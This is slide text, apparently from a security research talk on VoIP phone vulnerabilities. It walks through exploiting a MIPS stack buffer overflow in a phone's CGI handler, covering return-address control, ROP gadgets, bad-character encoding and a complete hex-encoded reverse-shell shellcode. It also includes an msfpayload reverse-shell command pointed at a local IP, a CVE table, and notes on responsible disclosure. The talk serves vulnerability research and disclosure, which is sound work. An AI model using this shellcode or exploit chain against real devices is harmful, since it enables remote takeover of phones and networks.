aajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabg'
handle_cgi_command(undefined4 param_1, undefined4 param_2, undefined4 param_3, char *cgi_param) {
char targetBuffer [32];
…
memset(targetBuffer,0,0x20);
iVar1 = strncmp(cgi_param, "/hl_web/cgi_command=", 0x14); 
if (iVar1 == 0) {
CopyToCommandStr(targetBuffer, cgi_param + 0x14);
...
Stack Based Buffer Overflow (MIPS)
107
handle_cgi_command(undefined4 param_1, undefined4 param_2, undefined4 param_3, char *cgi_param) {
char targetBuffer [32];
…
memset(targetBuffer,0,0x20);
iVar1 = strncmp(cgi_param, "/hl_web/cgi_command=", 0x14); 
if (iVar1 == 0) {
CopyToCommandStr(targetBuffer, cgi_param + 0x14);
...
…
void CopyToCommandStr(char *target, char *input) {
char *local_target = target;
char *local_input = input ;
while ((*local_input != '(' && (*local_input != 0))) {
*local_target = *local_input;
local_target = local_target + 1;
local_input = local_input + 1;
}
return;
}
Stack Based Buffer Overflow (MIPS)
108
handle_cgi_command(undefined4 param_1, undefined4 param_2, undefined4 param_3, char *cgi_param) {
char targetBuffer [32];
…
memset(targetBuffer,0,0x20);
iVar1 = strncmp(cgi_param, "/hl_web/cgi_command=", 0x14); 
if (iVar1 == 0) {
CopyToCommandStr(targetBuffer, cgi_param + 0x14);
...
…
void CopyToCommandStr(char *target, char *input) {
char *local_target = target;
char *local_input = input ;
while ((*local_input != '(' && (*local_input != 0))) {
*local_target = *local_input;
local_target = local_target + 1;
local_input = local_input + 1;
}
return;
}
stop criteria filling the buffer
Control $ra
109
------------------------------------------------------------------- registers ----
…
$s8  : 0x61616265 ("aabe"?)
$pc
: 0x0080a9b4 -> 0x27bd00a8
$sp
: 0x7cffb498 -> 0x00d89c48 -> 0x2a2a2a2a ("****"?)
…
$ra
: 0x61616266 ("aabf"?)
$gp
: 0x00e42900 -> 0x00000000
------------------------------------------------------------ code:mips:MIPS32 ----
…
->  0x80a9b4                  addiu
sp, sp, 168
0x80a9b8                  jr
ra
0x80a9bc                  nop
…
---------------------------------------------------------------------------------------------
gef> x/60wx $sp
0x7cffb498:
0x00d89c48
0x7cffb4b4
0x00000000
0x00000000
…
0x7cffb528:
0x6161617a
0x61616262
0x61616263
0x61616264
0x7cffb538:
0x61616265
0x61616266
0x61616267
0xffffffff
…
gef> 
we control
we control
jump to (return) address in register (we control)
stack
$s8
$ra
Exploit Development, Challenges
110
 How to bypass NX protection, ASLR, …?
Exploit Development, Challenges
111
 How to bypass NX protection, ASLR, …?
 Generate shell code and put it onto the stack e.g.
gef> checksec
[+] checksec for '/tmp/gef/265//bin/voip'
Canary
: No
NX                            : No
PIE                           : No
Fortify
: No
RelRO
: No
msfpayload linux/mipsbe/shell_reverse_tcp lport=4444 lhost=192.168.2.102
Exploit Development, Challenges
112
 How to find the stack address with our shell code?
…
0x7ff22000 0x7ff37000 0x00000000 rwx [stack]
…
…
0x7fc58000 0x7fc6d000 0x00000000 rwx [stack]
…
vs.
Exploit Development, Challenges
113
 How to find the stack address with our shell code?
 Find gadgets in libc to load stack address into a register:
…
0x7ff22000 0x7ff37000 0x00000000 rwx [stack]
…
…
0x7fc58000 0x7fc6d000 0x00000000 rwx [stack]
…
vs.
x/4i 0x2AE3EEE8
0x2ae3eee8 :
addiu
a0,sp,32
0x2ae3eeec :
lw
ra,28(sp)
0x2ae3eef0 :
jr
ra
0x2ae3eef4 :
addiu
sp,sp,32
x/4i 0x2AE5B9BC
0x2ae5b9bc :
move
t9,a0
0x2ae5b9c0 :
sw
v0,24(sp)
0x2ae5b9c4 :
jalr
t9
0x2ae5b9c8 :
addiu
a0,sp,24
“write “ stack pointer + 32 to register $a0
jump to next gadget
move $a0 to $t9
jump to value in $t9 = $a0 = $sp + 32
Exploit Development, Challenges
114
 How to handle bad chars?
0x00, 0x09, 0x0a, 0x0d, 0x20, 0x23, 0x28, 0x29, 0x5b, 0x5d, 0x2f2f
Exploit Development, Challenges
115
 How to handle bad chars?
 Write/use an encoder/encryption*:
0x00, 0x09, 0x0a, 0x0d, 0x20, 0x23, 0x28, 0x29, 0x5b, 0x5d, 0x2f2f
*https://www.vantagepoint.sg/papers/MIPS-BOF-LyonYang-PUBLIC-FINAL.pdf
# Load decimal value 99999999 into register $s2
li $s1, 2576980377
la $s2, 1000($sp)  // Copy Stack Pointer Address + 1000 bytes into register $s2
addi $s2, $s2, -244   // Adjust Register $s2 (address location) by -244
lw $t2, -500($s2) // Get value located at register $s2 – 500 bytes and store into $t2
# XOR value stored at $t2 and $s1 and store it into register $v1
xor $v1, $t2, $s1
# Replace value back to stack ($s2 – 500) with new XORed value ($v1).
sw $v1, -500($s2)
Exploit Structure
116
 Payload structure:
Padding
AAA...A
Gadget 1
address
$a0 = $sp +32
Gadget 2
address
$t9 = $a0
jump to $t9 
Decoder
assembly
xor with 99999999
Shellcode
assembly
Execute /bin/sh
modify code
Exploit Development, Another Challenges
117
Memory (Stack)
…
addi $a0, $t7, -3
addi $a1, $t7, -3
…
Instruction Cache
…
addi $a0, $t7, -3
addi $a1, $t7, -3
…
Data Cache
…
addi $a0, $t7, 5
addi $a1, $t7, 5
…
Processor 
Core
Exploit Development, Another Challenges
118
Memory (Stack)
…
addi $a0, $t7, -3
addi $a1, $t7, -3
…
Instruction Cache
…
addi $a0, $t7, -3
addi $a1, $t7, -3
…
Data Cache
…
addi $a0, $t7, 5
addi $a1, $t7, 5
…
Processor
Core
Solving Caching Problem
119
 Trigger cache flush:
 Call sleep syscall to trigger cache flush
 Find, call cache flush (__clear_cache) function
 Build shellcode avoiding bad char:
 Use assembly instruction without 0 bytes and bad char bytes
 Hardcoded encoded values, decode at runtime
MIPS Examples
120
 Set a parameter value (to zero):
Semantic
Mnemonic
Assembly
$a0 = 2
li $a0, 2
\x24\x04\x00\x02
$t7 = 0 – 6 = -6
$t7 = not(-6) = 5
$a0 = $t7 – 3 = 5 - 3 = 2
addiu $t7, $zero, -6
not $t7, $t7
addi $a0, $t7, -3
\x24\x0f\xff\xfa\x01
\xe0\x78\x27\x21\xe4
\xff\xfd
MIPS Examples
121
 Set a parameter value (to zero):
Semantic
Mnemonic
Assembly
$a0 = 2
li $a0, 2
\x24\x04\x00\x02
$t7 = 0 – 6 = -6
$t7 = not(-6) = 5
$a0 = $t7 – 3 = 5 - 3 = 2
addiu $t7, $zero, -6
not $t7, $t7
addi $a0, $t7, -3
\x24\x0f\xff\xfa\x01
\xe0\x78\x27\x21\xe4
\xff\xfd
Semantic
Mnemonic
Assembly
$a2 = 0
li $a2, 0
\x24\x04\x00\x00
$a2 = $t7 xor $t7 = 0
Xor $a2, $t7, $t7
\x01\xef\x30\x26
MIPS Examples
122
 Handle “strings” and critical chars:
Semantic
Mnemonic
Assembly
$t7 = //bi
lui     $t7, 0x2f2f
ori
$t7, $t7, 0x6269
\x3c\x0f\x2f\x2f\x35
\xef\x62\x69
$t4 = 0xb6b6fbf0
$t6 =  99999999
$t7 = $t4 xor $t6 = 0x2f2f6269 = //bi
li $t4, 0xb6b6fbf0
li $t6, 2576980377
xor $t7, $t4, $t6
\x3c\x0c\xb6\xb6\x35
\x8c\xfb\xf0\x3c\x0e
\x99\x99\x35\xce\x99
\x99\x01\x8e\x78\x26
Final Shellcode
123
\x24\x0f\xff\xfa\x01\xe0\x78\x27\x21\xe4\xff
\xfd\x21\xe5\xff\xfd\x01\xef\x30\x26\x24\x02
\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f
\xa4\xff\xff\x34\x0f\xff\xfd\x01\xe0\x78\x27
\xaf\xaf\xff\xe0\x3c\x0e\x11\x5c\x35\xce\x11
\x5c\xaf\xae\xff\xe4\x3c\x0e\xc0\xa8\x35\xce
\x02\x66\xaf\xae\xff\xe6\x27\xa5\xff\xe2\x24
\x0c\xff\xef\x01\x80\x30\x27\x24\x02\x10\x4a
\x01\x01\x01\x0c\x8f\xa4\xff\xff\x24\x0f\xff
\xfa\x01\xe0\x78\x27\x21\xe5\xff\xfb\x24\x02
\x0f\xdf\x01\x01\x01\x0c\x21\xe5\xff\xfc\x24
\x02\x0f\xdf\x01\x01\x01\x0c\x21\xe5\xff\xfd
\x24\x02\x0f\xdf\x01\x01\x01\x0c\x01\xef\x30
\x26\x3c\x0c\xb6\xb6\x35\x8c\xfb\xf0\x3c\x0e
\x99\x99\x35\xce\x99\x99\x01\x8e\x78\x26\xaf
\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce\x73\x68
\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff
\xec\xaf\xa4\xff\xf8\xaf\xa0\xff\xfc\x27\xa5
\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c
our shellcode
Assembly – Big Endian
124
Demo Time
Device Overview
Vendor
Device
FW
Finding
CVE
Alcatel-Lucent
8008 CE
1.50.03
CVE-2019-14259
Akuvox
R50
50.0.6.156
CVE-2019-12324
CVE-2019-12326
CVE-2019-12327
Atcom
A11W
2.6.1a2421
CVE-2019-12328
AudioCodes
405HD
2.2.12
CVE-2018-16220,
CVE-2018-16219
CVE-2018-16216
Auerswald
COMfortel 2600 IP
2.8D
Auerswald
COMfortel 1200 IP
3.4.4.1
CVE-2018-19977
CVE-2018-19978
Avaya
J100
4.0.1
Cisco
CP-7821
11.1.2
Digium
D65
2.7.2
Fanvil
X6
1.6.1
Gigaset
Maxwell Basic
2.22.7
CVE-2018-18871
https://www.sit.fraunhofer.de/cve/
Vendor
Device
FW
Finding
CVE
Grandstream
DP750
1.0.3.37
Htek
UC902
2.6.1a2421
CVE-2019-12325
Huawei
eSpace 7950
V200R003C
30SPCf00
CVE-2018-7958
CVE-2018-7959
CVE-2018-7960
Innovaphone
IP222
V12r2sr16
Mitel
6865i
5.0.0.1018
RIP
Obihai
6.3.1.0
5.1.11
CVE-2019-14260
Panasonic
KX-TGP600
06.001
Polycom
VVX 301
5.8.0
Samsung
SMT-i6010
1.62
Univy
CP200
V1 R3.8.10
Yealink
SIP-T41P
66.83.0.35
CVE-2018-16217
CVE-2018-16218
CVE-2018-16221
125
Vulnerability Overview
126
Real World
127
Recommendations for Users/Admins
128
 Change default credentials
 Update your VoIP phone 
 Disable servers (Web, SSH, Telnet, etc…) if possible and not needed
 Network protection measures for phones
 …
Recommendations for Developers
129
 Process separation and isolation
 Compile flags: ASLR, NX protection, Canaries, etc.
 No hardcoded keys, and/or self-made crypto
 No default credentials  enforce change at first start
 Convenient update mechanism
Lessons Learned?
1992
Linux OS, multi user
130
Lessons Learned?
1992
Linux OS, multi user
1996
“Smashing The Stack
For Fun And Profit“
131
Lessons Learned?
1992
Linux OS, multi user
1996
“Smashing The Stack
For Fun And Profit“
2000-2004
NX protection, ASLR 
132
Lessons Learned?
1992
Linux OS, multi user
1996
“Smashing The Stack
For Fun And Profit“
2000-2004
NX protection, ASLR 
2007
iPhone, all apps run as root
133
Lessons Learned?
1992
Linux OS, multi user
1996
“Smashing The Stack
For Fun And Profit“
2000-2004
NX protection, ASLR 
2007
iPhone, all apps run as root
2010/2011
iOS 4 / Android 4 ASLR
134
Lessons Learned?
1992
Linux OS, multi user
1996
“Smashing The Stack
For Fun And Profit“
2000-2004
NX protection, ASLR 
2007
iPhone, all apps run as root
2010/2011
iOS 4 / Android 4 ASLR
NÕW
Security in VoIP
135
Lessons Learned?
1992
Linux OS, multi user
1996
“Smashing The Stack
For Fun And Profit“
2000-2004
NX protection, ASLR 
2007
iPhone, all apps run as root
2010/2011
iOS 4 / Android 4 ASLR
NÕW
Security in VoIP
136
137
Somthing went wrong
Responsible Disclosure
138
 Informed all vendors, 90 days to fix the bugs
 Reactions:
 “Why investigating our poor phones”?
 “We bought phone from other vendor, we cannot fix it”
 “It’s not supported anymore”
 “...” – “We are going to publish” – “We will fix immediately”
 In the end, most vendors (2 did not react) fixed the vulnerabilities
Summary
139
 Investigated 33 VoIP phones
 Found 40 vulnerabilities and registered 16 CVEs
 A lot of old technology is out there, new models getting better
 Some vendors switch to Android, seems to be more robust but 
new types of vulnerabilities  Apps on your VoIP phone?
 We don’t know what will be next after IoT, but there will be a root 
process and memory corruption ;-)
140
141
Stephan Huber
Email: PI:EMAIL
Philipp Roskosch
Email: PI:EMAIL
Web: https://www.team-sik.org
Email: PI:EMAIL
Findings: https://www.sit.fraunhofer.de/cve
Contact